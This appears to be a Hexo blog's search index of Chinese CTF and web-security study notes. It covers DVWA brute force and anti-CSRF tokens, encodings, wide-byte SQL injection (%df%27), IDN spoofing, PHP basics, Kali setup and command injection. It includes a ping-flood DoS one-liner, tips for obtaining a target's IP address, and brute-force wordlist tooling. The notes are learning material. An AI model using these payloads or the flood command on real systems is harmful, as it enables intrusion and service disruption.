mysqli_fetch_assoc( $result ); $avatar = $row[&quot;avatar&quot;]; // Login successful echo &quot;&lt;p&gt;Welcome to the password protected area &#123;$user&#125;&lt;/p&gt;&quot;; echo &quot;&lt;img src=\\&quot;&#123;$avatar&#125;\\&quot; /&gt;&quot;; &#125; else &#123; // Login failed sleep( rand( 0, 3 ) ); echo &quot;&lt;pre&gt;&lt;br /&gt;Username and/or password incorrect.&lt;/pre&gt;&quot;; &#125; ((is_null($___mysqli_res = mysqli_close($GLOBALS[&quot;___mysqli_ston&quot;]))) ? false : $___mysqli_res);&#125;// Generate Anti-CSRF tokengenerateSessionToken();?&gt; stripslashes() 函数删除由 addslashes() 函数添加的反斜杠。该函数可用于清理从数据库中或者从 HTML 表单中取回的数据。PHP版本：4+ sleep(seconds) 函数延迟代码执行若干秒。 若成功，返回 0，否则返回 false checkToken(token, callback)检查JSON Web令牌的有效性token:字符串，需要检查的令牌callback:函数，回收处理响应（Callback handling the response） anti-CSRF Token:用来防范CSRF（跨站点伪造）攻击，防范CSRF攻击的方案有许多种，有用验证码来防的(tenfy:方案比较重，适合于敏感数据的变更类操作，对一般查询信息类不是很合适)，更多的是生成一个随机的token，当用户提交的时候，在服务器端比对一下token值是否正确，不正确就丢弃掉，正确就验证通过。由于是对比token，会存在两个需要进行对比的token，其中一个，已经下发到用户的返回页面里去了，而且是用户提交请求时候的一个必须的参数。另外一个token，一般就存在于服务器的session中或者是保存在完整session的cookie中。在实际应用的时候，往往这个token是作为一个hidden字段加在form表单里的，或者是加在某些link里。 由于使用了Anti-CSRF token，每次服务器返回的登陆页面中都会包含一个随机的user_token的值，用户每次登录时都要将user_token一起提交。服务器收到请求后，会优先做user_token的检查，再进行sql查询。所以，我们不能再利用burpsuite进行爆破。 这里就需要写一个python脚本来爆破。（好吧，现学）参考：anti-CSRF Token布署时需要注意的一点问题维基百科–CSRF","categories":[],"tags":[]},{"title":"没有名字","slug":"没有名字","date":"2019-12-31T15:50:38.000Z","updated":"2020-03-23T12:27:21.168Z","comments":true,"path":"2019/12/31/没有名字/","link":"","permalink":"http://yoursite.com/2019/12/31/没有名字/","excerpt":"var cnzz_protocol = ((\"https:\" == document.location.protocol) ? \"https://\" : \"http://\");document.write(unescape(\"%3Cspan style='display:none;' id='cnzz_stat_icon_1278295208'%3E%3C/span%3E%3Cscript src='\" + cnzz_protocol + \"s9.cnzz.com/z_stat.php%3Fid%3D1278295208%26show%3Dpic1' type='text/javascript'%3E%3C/script%3E\")); 2019再见 &ensp;&ensp; 2019就要过去啦，竟然有点不舍，不知从什么时候开始也想要时间变得慢一点。是因为快要考试了但还一点没复习所以心虚吗，还是因为没睡够没玩够？是因为想要学的东西太多而自己又太笨？是因为看到幼小的他们渐渐长大，有的甚至将要步入婚姻，一时有点难以接受？还是因为猛地发现年轻的他们不再年轻，而我却天真地以为一切都还是老样子……","text":"var cnzz_protocol = ((\"https:\" == document.location.protocol) ? \"https://\" : \"http://\");document.write(unescape(\"%3Cspan style='display:none;' id='cnzz_stat_icon_1278295208'%3E%3C/span%3E%3Cscript src='\" + cnzz_protocol + \"s9.cnzz.com/z_stat.php%3Fid%3D1278295208%26show%3Dpic1' type='text/javascript'%3E%3C/script%3E\")); 2019再见 &ensp;&ensp; 2019就要过去啦，竟然有点不舍，不知从什么时候开始也想要时间变得慢一点。是因为快要考试了但还一点没复习所以心虚吗，还是因为没睡够没玩够？是因为想要学的东西太多而自己又太笨？是因为看到幼小的他们渐渐长大，有的甚至将要步入婚姻，一时有点难以接受？还是因为猛地发现年轻的他们不再年轻，而我却天真地以为一切都还是老样子…… 这一年写的日记好多好多，一年里发生的事情、遇到的人、奇奇怪怪的想法，开心、苦恼、希望、思念。翻日记是朕的一大乐趣，一种只属于我们–现在的自己和那时的自己的私密而又真实的乐趣。18年，种种原因，我没有得到自己想要的结果，那时的失落是一大箱零食都不能抹去的，19年，通过努力终于有了一点改变，他们说也许是一个大大的转折呢，但我也说不清呐。我只知道又有新的门开启，至于我会怎样选择、怎样做，这都是2020年的事儿啦。 那就来说说2020（虽然讨厌立flag，说些容易做的）。 首先要多给外婆打电话，有空多去看看 技术要继续学，不要放弃 认识一些有趣的朋友 兴趣爱好要坚持 早睡早起 （这个。。。还是算了） 今天弄丢了我可爱的假宝鱼，它陪了我两年呢，不过相信它明年会回来找我的，嗯，我相信。现在是个没有钥匙不敢出门的寝室的孤儿，和代码一起跨年，哦，当然，还有朕的男朋友。 2020幸会~","categories":[],"tags":[{"name":"随笔","slug":"随笔","permalink":"http://yoursite.com/tags/随笔/"},{"name":"xun9er日常废话","slug":"xun9er日常废话","permalink":"http://yoursite.com/tags/xun9er日常废话/"}]},{"title":"关于编码","slug":"bianma","date":"2019-12-13T15:19:19.000Z","updated":"2020-03-13T09:44:33.304Z","comments":true,"path":"2019/12/13/bianma/","link":"","permalink":"http://yoursite.com/2019/12/13/bianma/","excerpt":"var cnzz_protocol = ((\"https:\" == document.location.protocol) ? \"https://\" : \"http://\");document.write(unescape(\"%3Cspan style='display:none;' id='cnzz_stat_icon_1278295208'%3E%3C/span%3E%3Cscript src='\" + cnzz_protocol + \"s9.cnzz.com/z_stat.php%3Fid%3D1278295208%26show%3Dpic1' type='text/javascript'%3E%3C/script%3E\")); 字符编码那些事被搞晕了，所以来理理各种编码，以及记录一些奇奇怪怪的编码绕过；","text":"var cnzz_protocol = ((\"https:\" == document.location.protocol) ? \"https://\" : \"http://\");document.write(unescape(\"%3Cspan style='display:none;' id='cnzz_stat_icon_1278295208'%3E%3C/span%3E%3Cscript src='\" + cnzz_protocol + \"s9.cnzz.com/z_stat.php%3Fid%3D1278295208%26show%3Dpic1' type='text/javascript'%3E%3C/script%3E\")); 字符编码那些事被搞晕了，所以来理理各种编码，以及记录一些奇奇怪怪的编码绕过； Unicode和ASCII和ANSI和GBK和UTF-8 Unicode：Unicode使用2个字节表示一个字符（也有4个字符的偏僻字符），它把所有的字符都编在了一套编码里； ASCII：ASCII是1个字节的，经过演变，使用一个字节的全部8位(bit)来表示字符，这就叫扩展ASCII码。范围是0x00 - 0xFF 共256个字符。 ANSI： ANSI是一种字符代码，为使计算机支持更多语言，通常使用 0x00-0x7f 范围的1 个字节来表示 1 个英文字符。超出此范围的使用0x80-0xFFFF来编码，即扩展的ASCII编码。 &emsp;大致如下：&emsp; 字符代码表示范围一个字符用的字节数适用范围 ASCII17 位或8 位二进制数组合来表示128 或256 种可能的字符 1字节所有的大写和小写字母，数字0 到9、标点符号， 以及在美式英语中使用的特殊控制字符 ANSI 0x80~0xFFFF（前0x00~0x7f表示英文，后面0x80~0xFFFF表示其他语言的字符）1-2字节不同国家有属于本国的不同的ANSI编码，因此会出现混合文本中有乱码的情况 GBK编码0x8140-0xFEFE2字节国人对于ASCII的扩展，开始是GB2312后来扩展为GB18030 这一系列统称DBCS\"（Double Byte Charecter Set 双字节字符集） Unicode对于ASCII编码表里的字符，保持其编码不变，只是将长度扩展到了16位，其他国家的字符全部统一重新编码2字节世界所有字符（IOS制定） UTF-8基于Unicode1-6个字节（常用的英文字母被编码成1个字节，汉字通常是3个字节，只有很生僻的字符才会被编码成4-6个字节）基于Unicode &emsp; 多字符集和宽字符集 多字节字符集（ANSI编码又称为”MBCS（Muilti-Bytes Charecter Set，多字节字符集））：用多个字节表示字符的编码集合，一般英文字母用1byte，其他像汉语之类的用2byte，兼容ASCII 127，它包括了GB-2312、BIG5等标准，不同 ANSI 编码之间互不兼容，当信息在国际间交流时，无法将属于两种语言的文字，存储在同一段 ANSI 编码的文本中。 宽字节字符集（UNICODE）：也叫万国码、通用码。 宽字节注入：原理：当PHP编码设为utf-8而数据库编码设置为GBK时会出现这个注入。也就是在用户提交参数时使用addslashes（）函数过滤掉预定义字符比如“’”、“””等，把它们进行转义。而由于两边色编码方式不一样，当输入%df%27时，通过addslashes（）函数在“’”(%27)前面加了一个“\\”(%5c)，转化为%df%5c%27，在经过数据库的GBK编码（每两字节当作一个汉字）时“%df%5c”被转为了一个“運”，留下一个“%27”还是“’”，就说这个单引号逃逸出来形成了注入。此外，这种注入情况一般不容易发生。攻防世界·cat&emsp;&emsp;发现是需要ping地址，输入127.0.0.1后出现ping的结果，127.0.0.2也可：&emsp;&emsp;这里就考虑命令注入了，但我没试出来，看的wp，有的是用的fuzzy测试，最后发现“@”不会被过滤，考虑使用宽字节注入后可以得到一大段HTML代码：&emsp;&emsp;&emsp;&emsp;这里报错大概是说编码转化的问题，也就是宽字节导致的，是关于Django框架1,&emsp;&emsp;&emsp;&emsp;在下面setting那一栏里可以看到有数据库的路径：&emsp;&emsp;&emsp;&emsp;PHP curl_setopt函数 的option可选参数中有这样一条：&emsp;&emsp;&emsp;&emsp;因此在数据库路径前面加上@：&emsp;&emsp;&emsp;&emsp;得到另一个一大块的HTML代码，转为HTML文件后又是一个报错页面，python的str默认是ascii编码2，和unicode编码冲突，就会报这个标题错误（此外，txt文件的默认编码也是gbk）：&emsp;&emsp;&emsp;&emsp;在下面找到：&emsp;&emsp; &emsp;1 : Django:是一个开放源代码的Web应用框架，由Python写成。Django的主要目的是简便、快速的开发数据库驱动的网站。2 : python2.x默认的字符编码是ASCII，默认的文件编码也是ASCII,python3.x默认的字符编码是unicode，默认的文件编码是utf-8 idna编码与utf-8解码造成的漏洞IDN国际化域名（英语：Internationalized Domain Name，缩写：IDN）又称特殊字符域名，是指部分或完全使用特殊的文字或字母组成的互联网域名，包括法语、阿拉伯语、中文、斯拉夫语、泰米尔语、希伯来语或拉丁字母等非英文字母，这些文字经多字节万国码编译而成。在域名系统中，国际化域名使用Punycode转写并以美国信息交换标准代码字符串储存。 idnapython pypi可以下载的库。 支持RFC 5891中指定的国际化域名(IDNA)协议的库。这个版本的协议通常被称为“IDNA2008”，可以产生与2003年早期标准不同的结果。idna 漏洞有些字符（同形异义字）经过idna编码再用utf-8解码后就成了另外的样子。被用于网址欺骗。 123456789101112131415string=&quot;℆&quot;# 对string进行idna编码：print(string.encode(&apos;idna&apos;))b=string.encode(&apos;idna&apos;)#对编码后的内容进行utf-8解码print(b.decode(&apos;utf-8&apos;))#运行结果： b&apos;c/u&apos;c/u[Finished in 0.1s] 这样就可以绕过一些过滤。 相关–IDN欺骗它利用国际化网域名称（IDN）可以以Unicode字符命名网址的特性，透过同形异义字，鱼目混珠。例如入侵者可以注册一个和著名网站差不多的网址名。例如有西里尔字母的pаypal.com。例如以数字0伪装英文字母O（G00GLE.COM -&gt; GOOGLE.COM），i的大楷I或数字1伪装L小楷的l（google.com -&gt; googIe.com），rn（r与n）伪装m等。 IDN欺骗防治 Punycode可以防止IDN欺骗。在默认情况下，许多web浏览器使用Punycode编码来表示URL中的Unicode字符，以防止同形异义字钓鱼攻击。 将非ASCII字符高亮显示。 域名注册机构不容许这类域名的注册，或是由该公司将此类域名先注册起来并导到正确的域名。其中火狐的punycode需要在about:config里打开“network.IDN_show_punycode”项（默认关闭）。 参考：Punycode-钓鱼欺骗码浅谈Unicode设计的安全性wiki 参考：【PHP代码审计】入门之路——第二篇-宽字节注入php预定义字符","categories":[],"tags":[]},{"title":"2019.12.14-","slug":"week-4-5","date":"2019-12-01T08:07:13.000Z","updated":"2020-03-23T12:30:29.048Z","comments":true,"path":"2019/12/01/week-4-5/","link":"","permalink":"http://yoursite.com/2019/12/01/week-4-5/","excerpt":"var cnzz_protocol = ((\"https:\" == document.location.protocol) ? \"https://\" : \"http://\");document.write(unescape(\"%3Cspan style='display:none;' id='cnzz_stat_icon_1278295208'%3E%3C/span%3E%3Cscript src='\" + cnzz_protocol + \"s9.cnzz.com/z_stat.php%3Fid%3D1278295208%26show%3Dpic1' type='text/javascript'%3E%3C/script%3E\")); 2019.11.14 php 克隆对象 如果直接用普通数据方法： 12345678910111213141516&lt;?phpclass SportObject&#123; private $object_type=&apos;book&apos;; public function setType($type)&#123; $this-&gt;object_type=$type; &#125; public function getType()&#123; return $this-&gt;object_type; &#125;&#125; $book1= new SportObject(); $book2=$book1;//使用普通数据类型方法给book2赋值 $book1 ,$book2都是同一个标识符的拷贝 $book2-&gt;setType(&apos;computer&apos;); echo &apos;book1的值为:&apos;.$book1-&gt;getType();?&gt; 结果：book2是book1的一个引用。php的引用是别名，他指两个不同的变量名字指向相同的内容，在 PHP 5，一个对象变量已经不再保存整个对象的值。只是保存一个标识符来访问真正的对象内容。 当对象作为参数传递，作为结果返回，或者赋值给另外一个变量，另外一个变量跟原来的不是引用的关系，只是他们都保存着同一个标识符的拷贝，这个标识符指向同一个对象的真正内容。这里的比较就很直观https://www.cnblogs.com/kisslight/p/8493644.html。","text":"var cnzz_protocol = ((\"https:\" == document.location.protocol) ? \"https://\" : \"http://\");document.write(unescape(\"%3Cspan style='display:none;' id='cnzz_stat_icon_1278295208'%3E%3C/span%3E%3Cscript src='\" + cnzz_protocol + \"s9.cnzz.com/z_stat.php%3Fid%3D1278295208%26show%3Dpic1' type='text/javascript'%3E%3C/script%3E\")); 2019.11.14 php 克隆对象 如果直接用普通数据方法： 12345678910111213141516&lt;?phpclass SportObject&#123; private $object_type=&apos;book&apos;; public function setType($type)&#123; $this-&gt;object_type=$type; &#125; public function getType()&#123; return $this-&gt;object_type; &#125;&#125; $book1= new SportObject(); $book2=$book1;//使用普通数据类型方法给book2赋值 $book1 ,$book2都是同一个标识符的拷贝 $book2-&gt;setType(&apos;computer&apos;); echo &apos;book1的值为:&apos;.$book1-&gt;getType();?&gt; 结果：book2是book1的一个引用。php的引用是别名，他指两个不同的变量名字指向相同的内容，在 PHP 5，一个对象变量已经不再保存整个对象的值。只是保存一个标识符来访问真正的对象内容。 当对象作为参数传递，作为结果返回，或者赋值给另外一个变量，另外一个变量跟原来的不是引用的关系，只是他们都保存着同一个标识符的拷贝，这个标识符指向同一个对象的真正内容。这里的比较就很直观https://www.cnblogs.com/kisslight/p/8493644.html。 使用clone 12345678910111213141516&lt;?phpclass SportObject&#123; private $object_type=&apos;book&apos;; public function setType($type)&#123; $this-&gt;object_type=$type; &#125; public function getType()&#123; return $this-&gt;object_type; &#125;&#125; $book1= new SportObject(); $book2=clone $book1;//克隆对象 $book2-&gt;setType(&apos;computer&apos;); echo &apos;book1的值为:&apos;.$book1-&gt;getType();?&gt; 结果：对象比较：“==”比较对象 “===”比较对象引用地址 2019.11.16 zip伪加密 首先一个zip文件的组成：压缩源文件数据区+压缩源文件目录区+压缩源文件目录结束标志具体参考：一个zip文件由这样三部分组成首先做一个zip压缩包；用010 Editor打开； 可以看到文件不同的部分颜色不同，这里直接找到压缩源文件的全局方式标记；它表示了文件是否被加密，00 00说明没有加密；若将其改为末尾为奇数的就可以变为加密；得到： 2019.11.18 php备份文件 php的备份有两种：.php~和.php.bak如果网站存在备份文件，在地址栏最末加上/index.php~或/index.php.bak，即可得到备份文件 robots协议 robots协议也叫robots.txt（统一小写）是一种存放于网站根目录下的ASCII编码的文本文件，它通常告诉网络搜索引擎的漫游器（又称网络蜘蛛），此网站中的哪些内容是不应被搜索引擎的漫游器获取的，哪些是可以被漫游器获取的。因为一些系统中的URL是大小写敏感的，所以robots.txt的文件名应统一为小写。robots.txt应放置于网站的根目录下。如果想单独定义搜索引擎的漫游器访问子目录时的行为，那么可以将自定的设置合并到根目录下的robots.txt，或者使用robots元数据（Metadata，又称元数据）。robots.txt文件是浏览器访问网页时第一个访问的文件，它告诉浏览器哪些可以直接访问，哪些不行，但阻止不了恶意入侵。 2019.11.23 kali安装 汉语输入法 使用vim在镜像源文件中加deb http://http.kali.org/kali kali-rolling main non-free contribdeb http://mirrors.aliyun.com/kali kali-rolling main non-free contribvim的一些基本操作：a插入模式点esc后进入控制 :w保存 :q退出vim命令操作大全下载搜狗网址https://pinyin.sogou.com/linux/?r=pinyin；安装dpkg -i sogoupinyin_2.0.0.0068_amd64.deb依赖问题apt-get -f install然后再安装一会(然而搜狗没装上) 安装的时候用的校园网，然后kali里面没有装校园网客户端，就上不了网，但看上去网络是连上的，so，，，一直下载不了，又不知为什么，又一次被自己蠢哭。 镜像文件加上deb http://mirrors.aliyun.com/kali kali-rolling main non-free contrib 安装fcitx：apt-get install fcitx fcitx-googlepinyin 查看系统是否已经是最新apt-get update &amp;&amp; apt-get upgrade 如果要删除所有相关文件dpkg -P fcitx 自带的firefox上不了网 首先设置虚拟机的网络为桥接，还是不行先nslookup www.google.com.hk得到ip地址：74.125.128.199修改hosts文件sudo vi /etc/hosts在后面追加 74.125.128.199 www.google.com.hk重新启动网络`sudo /etc/init.d/networking restart` 物理机和虚拟机之间直接复制粘贴： 先下载了VMware但还是不行，又下载了open-vm-tools-desktopapt-get install open-vm-tools-desktop fuse就可以直接复制粘贴了；软件安装的一些指令：搜索：apt search xxx安装：apt install xxx卸载：apt remove xxx卸载并移除配置文件：apt-get purge xxx卸载自动安装并且未使用的软件：apt autoremove安装deb：dpkg -i /xxx/xxx/xxxx.deb 中文输入法： 一般安装GooglePinyin或者是Sogoupinyin。两种都试了，搜狗的一直有依赖问题，说是源里没有对应的可以用来安装，换了好几个源都不行，看到网上说是因为fcitx框架更新了，反正就是安不上；Google拼音就好装啦，不过需要注意的是配置了小企鹅之后还要修改kali的设置，加上中文（Pinyin）那一项（就因为这个弄了好久。。）； 安装git 安装内核头文件 apt-get install linux-headers-uname -r-yapt-get install vim -y 配置vi vi ~/.vimrc 安装解压缩工具 apt-get install unrar unace rar unrar p7zip zip unzip p7zip-full p7zip-rar file-roller -y 配置proxychains 解压rockyou字典 cd /usr/share/wordlists/gunzip rockyou.txt.gz vi /etc/proxychains.conf java环境换成java&nbsp;jdk 安装配置openvas 参考1参考2unfinished..awslshadowsocks-libev Unicode和ASCII ASCII：ASCII是1个字节的，经过演变，使用一个字节的全部8位(bit)来表示字符，这就叫扩展ASCII码。范围是0x00 - 0xFF 共256个字符。 GB-2312：中国人利用连续2个扩展ASCII码的扩展区域（0xA0以后）来表示一个汉字，该方法的标准叫GB-2312。 UNICODE：UNICODE使用2个字节表示一个字符（也有4个字符的偏僻字符），它把所有的字符都编在了一套编码里； UTF（Unicode Transformation Format）：字符翻译格式，可以根据字符的类型选择编码的长短，是为了提高Unicode的效率。例如：UTF-8编码把一个Unicode字符根据不同的数字大小编码成1-6个字节，常用的英文字母被编码成1个字节，汉字通常是3个字节，只有很生僻的字符才会被编码成4-6个字节。如果你要传输的文本包含大量英文字符，用UTF-8编码就能节省空间。 UTF-8 和 GBK UTF-8 包含全世界所有国家需要用到的字符，英文字母1字节，中文汉字3字节；（unicode） GBK是在国家标准GB-2312基础上扩容后兼容GB-2312的标准GBK包含所有中文字符，中文英文都是双字节（ANSI）； 中文程序偏向于用GBK，面向外国的用UTF-8 参考攻防世界·密码代码： 123456789101112131415161718192021222324252627282930313233&lt;html&gt;&lt;head&gt; &lt;title&gt;JS&lt;/title&gt; &lt;script type=&quot;text/javascript&quot;&gt; function dechiffre(pass_enc)&#123; var pass = &quot;70,65,85,88,32,80,65,83,83,87,79,82,68,32,72,65,72,65&quot;; var tab = pass_enc.split(&apos;,&apos;); var tab2 = pass.split(&apos;,&apos;); var i,j,k,l=0,m,n,o,p = &quot;&quot;; i = 0;j = tab.length;//j=? k = j + (l) + (n=0); //k=1 n = tab2.length;//n=18 for(i = (o=0); i &lt; (k = j = n); i++ )&#123;o = tab[i-l];p += String.fromCharCode((o = tab2[i])); if(i == 5)break;&#125; for(i = (o=0); i &lt; (k = j = n); i++ )&#123; o = tab[i-l]; if(i &gt; 5 &amp;&amp; i &lt; k-1) p += String.fromCharCode((o = tab2[i])); &#125; p += String.fromCharCode(tab2[17]); pass = p;return pass; &#125; String[&quot;fromCharCode&quot;](dechiffre(&quot;\\x35\\x35\\x2c\\x35\\x36\\x2c\\x35\\x34\\x2c\\x37\\x39\\x2c\\x31\\x31\\x35\\x2c\\x36\\x39\\x2c\\x31\\x31\\x34\\x2c\\x31\\x31\\x36\\x2c\\x31\\x30\\x37\\x2c\\x34\\x39\\x2c\\x35\\x30&quot;)); h = window.prompt(&apos;Enter password&apos;); alert( dechiffre(h) );&lt;/script&gt;&lt;/head&gt;&lt;/html&gt; UNICODE编码解码 12345678910111213141516171819&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt;&lt;meta charset=&quot;utf-8&quot;&gt;&lt;title&gt;UNICODE解码&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;p id=&quot;demo&quot;&gt;单击按钮显示指定UNICODE编码的字符。&lt;/p&gt;&lt;button onclick=&quot;myFunction()&quot;&gt;显示&lt;/button&gt;&lt;script&gt;function myFunction()&#123; var n=String.fromCharCode(55,56,54,79,115,69,114,116,107,49,50); document.getElementById(&quot;demo&quot;).innerHTML=n;&#125;&lt;/script&gt;&lt;/body&gt;&lt;/html&gt; 得到：把下面的那一串整理整理： 123456789101112131415&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt;&lt;meta charset=&quot;utf-8&quot;&gt;&lt;title&gt;分割字符串&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;?php$string=&quot;\\x35\\x35\\x2c\\x35\\x36\\x2c\\x35\\x34\\x2c\\x37\\x39\\x2c\\x31\\x31\\x35\\x2c\\x36\\x39\\x2c\\x31\\x31\\x34\\x2c\\x31\\x31\\x36\\x2c\\x31\\x30\\x37\\x2c\\x34\\x39\\x2c\\x35\\x30&quot;;$a=explode(&quot;\\\\&quot;, $string);print_r($a);?&gt;&lt;/body&gt;&lt;/html&gt; 得到：Array ( [0] =&gt; 55,56,54,79,115,69,114,116,107,49,50 )再把他们用UNICODE转一下得到：&emsp; 2019.11.27 X-Forwarded-For（XFF） X-Forwarded-For（XFF）是用来识别通过HTTP代理或负载均衡方式连接到Web服务器的客户端最原始的IP地址的HTTP请求头字段。 Squid 缓存代理服务器的开发人员最早引入了这一HTTP头字段，并由IETF在HTTP头字段标准化草案中正式提出。它的格式如下：X-Forwarded-For: client1, proxy1, proxy2, proxy3由逗号和一个空格隔开多个IP地址，client1是最原始客户端的IP地址，后面的都是代理；鉴于伪造这一字段非常容易，应该谨慎使用X-Forwarded-For字段。正常情况下XFF中最后一个IP地址是最后一个代理服务器的IP地址, 这通常是一个比较可靠的信息来源。 HTTP Refere HTTP Referer是header的一部分，当浏览器向web服务器发送请求的时候，一般会带上Referer，告诉服务器该网页是从哪个页面链接过来的，服务器因此可以获得一些信息用于处理。 他俩都可以被修改 盗链、防盗链 盗链： 是什么 盗链是指服务提供商自己不提供服务的内容，通过技术手段绕过其它有利益的最终用户界面（如广告），直接在自己的网站上向最终用户提供其它服务提供商的服务内容，骗取最终用户的浏览和点击率。 危害 1.会使服务器运行缓慢，影响用户体验，不能给原生网站带来任何流量；2.侵权； 防盗链 1.修改nginx.conf，设置白名单；2.Fileter拦截器方式防盗链； 反防盗链 2019.11.28--11.29 字典构造--CUPP 可以通过社工等方式获取一些信息，再通过CUPP来构造字典进行爆破； ping 数据上限windows最大值为“65500”，linux最大值为“65507”。简单的dos攻击（拒绝服务攻击）：1ping -l 65500 目标ip -t（65500 表示数据长度上限，-t 表示不停地ping目标地址，CTRL+C结束那么怎样获取想要的IP地址呢：1.1.通过运行OutLook express程序，并要求对方先给你发一封电子邮件，然后右键单击查看邮件属性，再单击“详细资料”，你会看到“Received: from xiecaiwen (unknown [11.xxx.xx.xx])”这样的信息2.通过电脑的防火墙日志查看对方的IP地址3.“netstat -n”命令，就可以看到最近有哪些IP和你进行了交流参考 command_execution 命令注入：就是在调用系统命令的后面通过&amp;&amp;、&amp;、|、||命令拼接符号来加上自己需要执行的系统命令 命令 执行情况 command1 && command2 先执行command1成功后执行command2 command1&command2 先执行command2后执行command1（两者无制约关系） command1||command2 command1执行失败后才会执行command2 command1|command2 只执行command2（command1的输出作为command2的输入） 这里就涉及到命令行的一些指令的使用Windows CMD命令大全题目中说有ping但没写waf先ping加find来找flag.txtcat 查看文本内容 &emsp; 就get到了flag","categories":[],"tags":[{"name":"kali配置","slug":"kali配置","permalink":"http://yoursite.com/tags/kali配置/"},{"name":"乱七八糟","slug":"乱七八糟","permalink":"http://yoursite.com/tags/乱七八糟/"}]},{"title":"2019.11.12","slug":"2019-11-12","date":"2019-11-13T14:22:55.000Z","updated":"2019-12-15T14:06:50.197Z","comments":true,"path":"2019/11/13/2019-11-12/","link":"","permalink":"http://yoursite.com/2019/11/13/2019-11-12/","excerpt":"","text":"var cnzz_protocol = ((\"https:\" == document.location.protocol) ? \"https://\" : \"http://\");document.write(unescape(\"%3Cspan style='display:none;' id='cnzz_stat_icon_1278295208'%3E%3C/span%3E%3Cscript src='\" + cnzz_protocol + \"s9.cnzz.com/z_stat.php%3Fid%3D1278295208%26show%3Dpic1' type='text/javascript'%3E%3C/script%3E\")); 2019.11.12php final关键字：用在类上则该类不可以被继承，也不能再有子类；用在方法上则该方法不能被进行重写，也不能被覆盖； 抽象类(abstract)：不能被实例化，只能作为其他类的父类来使用。一个抽象类中至少要有一个抽象方法，抽象方法没有方法体，其功能的实现只能在子类中实现；eg： 123456789101112131415161718192021222324&lt;?phpabstract class CommodityObject&#123; abstract function service ($getName,$price,$num);&#125;class MyBook extends CommodityObject&#123; function service($getName,$price,$num)&#123; echo&apos;您购买的商品是&apos;.$getName.&apos;,该商品单价是&apos;.$price; echo&apos;您购买的数量是&apos;.$num.&apos;本&apos;; echo &apos;,如有缺页，三日内更换.&apos;; &#125;&#125;class MyComputer extends CommodityObject&#123; function service($getName,$price,$num)&#123; echo&apos;您购买的商品是&apos;.$getName.&apos;,该商品单价是&apos;.$price; echo&apos;您购买的数量是&apos;.$num.&apos;台&apos;; echo &apos;,如发生非人为质量问题，请在3月内更换.&apos;; &#125;&#125;$book=new MyBook();$computer=new MyComputer();$book-&gt;service(&quot;harry potter&quot;,99,3);echo &apos;&lt;p&gt;&apos;;$computer-&gt;service(&quot;mac&quot;,10000,5);?&gt; 接口的使用为实现多重继承。和抽象类功能类似，抽象类可以实现抽象类中公共的方法，接口可以实现多继承； 2019.11.13blog加ico，用的yilia主题，需要修改\\themes\\yilia\\layout_partial中的 12&lt;% if (theme.favicon)&#123; %&gt; &lt;link rel=&quot;icon&quot; href=&quot;/img/favicon.ico&quot;&gt; （改成这个样，原来是什么样我忘了，不过都差不多）然后在blog/source中创建img文件，把用比特虫转好的ico放在里面。加音乐播放器，在网易云音乐的网站上找到歌曲的外链，复制后直接粘贴加themes\\yilia\\layout_partial中的left-col.ejs中具体位置看情况之前一直没弄出来，应该是位置没放对。","categories":[],"tags":[]},{"title":"2019.11.10","slug":"2019-11-10","date":"2019-11-10T08:56:02.000Z","updated":"2019-12-24T10:48:24.816Z","comments":true,"path":"2019/11/10/2019-11-10/","link":"","permalink":"http://yoursite.com/2019/11/10/2019-11-10/","excerpt":"var cnzz_protocol = ((\"https:\" == document.location.protocol) ? \"https://\" : \"http://\");document.write(unescape(\"%3Cspan style='display:none;' id='cnzz_stat_icon_1278295208'%3E%3C/span%3E%3Cscript src='\" + cnzz_protocol + \"s9.cnzz.com/z_stat.php%3Fid%3D1278295208%26show%3Dpic1' type='text/javascript'%3E%3C/script%3E\")); 2019.10.28MD5(消息摘要算法第五版)MD5可能是16/32/64/128位16进制数，字母中只能出现A-FMD5算法具有以下特点：1、压缩性：任意长度的数据，算出的MD5值长度都是固定的。2、容易计算：从原数据计算出MD5值很容易。3、抗修改性：对原数据进行任何改动，哪怕只修改1个字节，所得到的MD5值都有很大区别。4、强抗碰撞：已知原数据和其MD5值，想找到一个具有相同MD5值的数据（即伪造数据）是非常困难的。因此md5可以作为数据的一个识别证，可以通过其md5值判断是否被篡改过。MD5碰撞：1.可以通过某些方法（如文件末尾添加一些二进制数据），在一个文件的基础上生成两个MD5相同的文件，但运行结果完全不同。2.MD5值以0e开头，后面无论是什么都会被当作0，因为是0的n次方；参考：https://bbs.pediy.com/thread-171087.htm 2019.10.29发现之所以local host运行不了是因为之前安装得PHP study文件夹在D盘，但由于重复安装，c盘也有一个phpstudy，而我每次都用得C盘的文件路径。嗯 划水的一天","text":"var cnzz_protocol = ((\"https:\" == document.location.protocol) ? \"https://\" : \"http://\");document.write(unescape(\"%3Cspan style='display:none;' id='cnzz_stat_icon_1278295208'%3E%3C/span%3E%3Cscript src='\" + cnzz_protocol + \"s9.cnzz.com/z_stat.php%3Fid%3D1278295208%26show%3Dpic1' type='text/javascript'%3E%3C/script%3E\")); 2019.10.28MD5(消息摘要算法第五版)MD5可能是16/32/64/128位16进制数，字母中只能出现A-FMD5算法具有以下特点：1、压缩性：任意长度的数据，算出的MD5值长度都是固定的。2、容易计算：从原数据计算出MD5值很容易。3、抗修改性：对原数据进行任何改动，哪怕只修改1个字节，所得到的MD5值都有很大区别。4、强抗碰撞：已知原数据和其MD5值，想找到一个具有相同MD5值的数据（即伪造数据）是非常困难的。因此md5可以作为数据的一个识别证，可以通过其md5值判断是否被篡改过。MD5碰撞：1.可以通过某些方法（如文件末尾添加一些二进制数据），在一个文件的基础上生成两个MD5相同的文件，但运行结果完全不同。2.MD5值以0e开头，后面无论是什么都会被当作0，因为是0的n次方；参考：https://bbs.pediy.com/thread-171087.htm 2019.10.29发现之所以local host运行不了是因为之前安装得PHP study文件夹在D盘，但由于重复安装，c盘也有一个phpstudy，而我每次都用得C盘的文件路径。嗯 划水的一天 2019.10.30学习PHP与JavaScript的交互：1.JavaScript的用处、规则；2.自定义函数：3.流程控制语句（条件、循环、跳转）；4.javascript事件；5.JavaScript脚本嵌入方式；（JavaScript嵌入：js写在&lt;head&gt;...&lt;/head&gt;之间的是函数和事件处理函数；写在&lt;body&gt;...&lt;/body&gt;之间的是网页内容或调用函数的程序块。）6.测试浏览器是否支持js及不支持的解决办法7.PHP中调用JavaScript脚本。（验证表单是否为空、制作二级导航菜单） 文件上传绕过：00截断 